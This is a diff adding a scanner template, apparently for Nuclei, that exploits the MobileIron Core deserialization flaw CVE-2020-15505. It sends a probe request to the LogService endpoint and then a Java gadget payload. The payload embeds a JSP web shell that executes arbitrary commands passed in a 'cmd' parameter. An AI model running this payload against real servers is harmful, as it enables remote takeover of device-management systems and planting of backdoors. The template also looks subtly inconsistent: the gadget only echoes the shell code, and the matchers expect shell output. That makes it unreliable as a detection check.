@@ -1,0 +1,54 @@
+id: mobileiron-rce-cve-2020-15505
+
+info:
+  name: MobileIron Remote Code Execution CVE-2020-15505
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    MobileIron Core 10.6 and earlier, Connector 10.6 and earlier, and Sentry 9.8 and earlier are vulnerable to remote code execution. A successful exploit could allow an attacker to execute arbitrary code.
+  reference:
+    - https://packetstormsecurity.com/files/161097/MobileIron-MDM-Hessian-Based-Java-Deserialization-Remote-Code-Execution.html
+  classification:
+    cve-id: CVE-2020-15505
+    cvss-score: 9.8
+
+variables:
+  cmd: "whoami"
+
+http:
+  - raw:
+      - |
+        POST /mifs/.;/services/LogService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: x-application/hessian
+        Referer: {{BaseURL}}
+
+        c30200480004
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/x-hessian"
+
+  - raw:
+      - |
+        POST /mifs/.;/services/LogService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: x-application/hessian
+        Referer: {{BaseURL}}
+
+        {{generate_java_gadget("commons-collections3.1", "echo '%3C%25@ page import=\"java.util.*,java.io.*\" %3E%3CHTML%3E%3CBODY%3ECommands with JSP%3CFORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"%3E%3CINPUT TYPE=\"text\" NAME=\"cmd\"%3E%3CINPUT TYPE=\"submit\" VALUE=\"Send\"%3E%3C/FORM%3E%3Cpre%3E%3C%25 if (request.getParameter(\"cmd\") != null) { out.println(\"Command: \" + request.getParameter(\"cmd\") + \"%3CBR%3E\"); Process p; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); } else { p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while (disr != null) { out.println(disr); disr = dis.readLine(); } } %3E%3C/pre%3E%3C/BODY%3E%3C/HTML%3E", "base64")}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Command:"
+          - "System.getProperty"
